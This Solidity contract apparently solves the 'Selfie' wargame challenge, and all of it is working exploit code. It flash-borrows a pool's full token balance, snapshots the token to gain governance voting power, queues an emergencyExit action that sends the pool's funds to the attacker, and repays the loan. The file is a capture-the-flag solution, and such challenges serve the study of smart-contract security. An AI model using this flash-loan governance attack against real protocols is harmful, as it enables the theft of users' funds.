// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface IPool {
    function flashLoan(IERC3156FlashBorrower _receiver, address _token, uint256 _amount, bytes calldata _data) external returns (bool);
}

interface IGovernance {
    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);
}

interface IERC20Snapshot is IERC20 {
    function snapshot() external returns (uint256 lastSnapshotId);
}

contract SelfieSolution {

    IPool immutable pool;
    IGovernance immutable governance;

    IERC20Snapshot immutable token;
    
    address immutable player;

    constructor(address _pool, address _governance, address _token) {

        pool = IPool(_pool);
        governance = IGovernance(_governance);

        token = IERC20Snapshot(_token);

        player = msg.sender;
    }

    function attack() external {
        require (msg.sender == address(player));

        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(token), token.balanceOf(address(pool)), "0x");

    }

    function onFlashLoan(address, address, uint256 _amount, uint256, bytes calldata) external returns (bytes32) {
        require (msg.sender == address(pool));
        require (tx.origin == player);

        token.snapshot();

        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", player);
        governance.queueAction(address(pool), 0, data);

        token.approve(address(pool), _amount);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}